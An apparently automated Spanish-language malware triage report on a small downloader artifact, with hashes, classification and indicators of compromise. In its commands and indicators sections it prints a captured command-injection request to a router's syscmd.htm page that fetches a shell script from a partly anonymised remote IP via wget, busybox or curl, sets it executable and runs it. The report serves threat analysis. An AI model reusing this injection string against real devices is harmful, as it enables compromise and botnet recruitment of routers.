# 🧬 Payload Analysis

`6e61df3e61c1f9106a7654176554edf765b176d2f11ca033e0b7c19bb7c4bc62`

## 📌 Resumen

Artefacto identificado como ASCII text, with CRLF line terminators de 440 B. La evidencia estática disponible identifica capacidad de descarga remota. La referencia remota apunta al recurso `wget.sh` en `hxxp://91.92.40.XXX/wget.sh`. Se observaron o extrajeron 1 comandos relacionados con el artefacto.


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:51:31.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `6e61df3e61c1f9106a7654176554edf765b176d2f11ca033e0b7c19bb7c4bc62`
- **SHA1:** `ec075d65cc449041b9a061a852fa4d0e795e75bf`
- **MD5:** `219e860f0fef152561b23b293048c2a3`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 440 B |
| Entropía | 5.24 |
| Strings | 6 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=5

## 🖥️ Comandos observados / extraídos

```text
submit-url=%2Fsyscmd.htm&sysCmd=cd%20/tmp%3Brm%20-f%20.s%3Bwget%20http://91.92.40.XXX/wget.sh%20-O%20.s%3Bbusybox%20wget
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://91.92.40.XXX/wget.sh%20-O%20.s%3Bbusybox%20wget%20http://91.92.40.XXX/wget.sh%20-O%20.s%3Bcurl%20-o%20.s%20http://91.92.40.XXX/wget.sh%3Bchmod%20777%20.s%3Bsh%20.s%20rep.boa%3Brm%20-f%20.s&sysCmdType=ping&apply=Apply | strings |
| ip | 91.92.40.XXX | static_analysis |
| ip | 190.179.169.XXX | static_analysis |
| command | submit-url=%2Fsyscmd.htm&sysCmd=cd%20/tmp%3Brm%20-f%20.s%3Bwget%20http://91.92.40.XXX/wget.sh%20-O%20.s%3Bbusybox%20wget | strings |
| hash | 6e61df3e61c1f9106a7654176554edf765b176d2f11ca033e0b7c19bb7c4bc62 | static_analysis |
| ip | 45.153.34.XXX | artifact_source |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | low interest unknown |
| Prioridad | low |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
